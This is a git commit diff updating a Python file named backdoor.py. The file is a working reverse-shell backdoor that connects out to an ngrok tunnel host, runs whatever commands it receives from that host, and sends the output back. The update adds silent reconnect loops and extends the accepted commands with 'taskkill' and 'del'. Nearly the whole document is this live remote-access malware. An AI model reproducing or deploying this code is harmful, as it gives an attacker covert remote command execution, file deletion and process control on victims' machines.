10b72a4cf6e2ce72f6e2d18a39036e2a36932087
xrlp <56208895+xrlplerl@users.noreply.github.com>
2019-10-29 00:20:59 -0300

    Update backdoor.py

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -1,15 +1,21 @@
 import socket,os
 
-port = 16354
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("0.tcp.ngrok.io",port))
-caract  = ["cd","start","cls","MSG","shutdown","py"]
 while True:
-    msg = str(s.recv(1024).decode("utf-8"))
-    if((msg.split())[0] in caract):
-        os.system(msg)
-        s.sendall(b"[!]")
-    else:
-        msg = bytes((os.popen(msg)).read(),"utf-8")
-        s.sendall(msg)
-    
+    try:
+        port = 11877
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("0.tcp.ngrok.io",port))
+        caract  = ["cd","start","cls","MSG","shutdown","py","taskkill","del"]
+        while True:
+            try:
+                msg = str(s.recv(1024).decode("utf-8"))
+                if((msg.split())[0] in caract):
+                    os.system(msg)
+                    s.sendall(b"[!]")
+                else:
+                    msg = bytes((os.popen(msg)).read(),"utf-8")
+                    s.sendall(msg)
+            except:
+                pass
+    except:
+        pass
